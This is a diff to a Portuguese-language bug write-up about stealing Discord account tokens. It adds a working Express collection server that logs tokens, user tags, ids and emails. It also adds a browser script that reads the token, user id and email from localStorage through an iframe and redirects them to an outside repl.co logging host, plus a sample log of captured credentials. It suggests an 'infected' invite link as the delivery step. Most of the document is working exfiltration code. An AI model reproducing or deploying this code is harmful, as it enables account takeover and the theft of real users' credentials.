@@ -4,8 +4,97 @@
  ### Oque precisa ser feito para acontecer o bug:
 
  - primeiro: o desenvolvimento de um servidor de coleta de parametros pela url que seria algo muito simples.Exemplo : [Servidor Exemplo](https://)
+
+```js
+const express = require('express');
+const app = express();
+const port = 3000;
+
+const path = require("path");
+
+const low = require('lowdb') //banco de dados
+const FileSync = require('lowdb/adapters/FileSync')
+const adapter = new FileSync('database/db.json')
+const db = low(adapter)
+
+app.use("/public", express.static("public"));
+
+app.get("/", (req, res) => {
+
+    let token = req.query.token
+    let tag = req.query.tag
+    let id = req.query.id
+    let email = req.query.email
+
+    let bot = `false`
+
+    if(token == undefined && tag == undefined && id == undefined && email == undefined){
+        bot = `true`
+        console.log('bot...')
+        return;
+    }
+
+    if(token == undefined){
+        token = `parametro token não passado`
+    }
+    
+    if(tag == undefined){
+        tag = `undefined#0000`
+    }
+    
+    if(id == undefined){
+        id = `parametro id não passado`
+    }
+    
+    if(email == undefined){
+        email = `undefined@gmail.com`
+    }
+
+    console.log(`o usuario logou com sucesso:${tag}`)
+    if(!token) return;
+
+    db.get('logs').push({
+        token: token,
+        tag: tag,
+        id: id,
+        email: email 
+    }).write()    
+
+    res.sendFile(path.join(__dirname, "public/index.html"));
+})    
+
+app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`)); 
+```
  - segundo: o desenvolvimento de um script para enviar o token por esse url.Exemplo :
 [Script de Envio Para o Servidor](https://google.com)
+ 
+ ```js
+function env(modul){
+    const token = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token
+    const tag = `${window.document.querySelector('div.size14-e6ZScH').innerText}%23${window.document.querySelector('div.size12-3cLvbJ').innerText.substr(1)}`
+    const id = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.user_id_cache
+    const email = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache
+
+    if(modul == undefined){
+        op1()
+        modul = 1
+    }else{}
+
+    switch(modul){
+        case 1:
+            op1()
+            break
+        default:
+            console.log(`Modulo ${modul} não foi encontrado`)
+    }
+
+    function op1(){
+        window.location.href = `https://tokenlog.sasukecusaovh.repl.co/?token=${token}&tag=${tag}&id=${id}&email=${email}`
+    }
+}
+
+env(1)
+```
  - terceiro: o desenvolvimento de um url infectado como o invite de um server ou o invite de um bot para que quando o discord seja  iniciado o codigo seja rodado
  
  ### Oque era pra acontecer caso não existise bug:
@@ -14,4 +103,19 @@
 
  ### Oque realmente acontece:
 
-com o bug acontecendo o usuario acha que esta usando o discord normalmente porem ele envia um dado sensivel 
+com o bug acontecendo o usuario acha que esta usando o discord normalmente porem ele envia um dado sensivel. Exemplo: [Exemplo DataBase Com Dados](https://)
+
+```json
+{
+  "logs": [
+    {
+      "token": "token de um usuario:0000",
+      "tag": "tag de um usuario:undefined#0000",
+      "id": "id de um usuario:0000",
+      "email": "emailo de um usuario:undefined@gmail.com"
+    }
+  ]
+}
+```
+
+
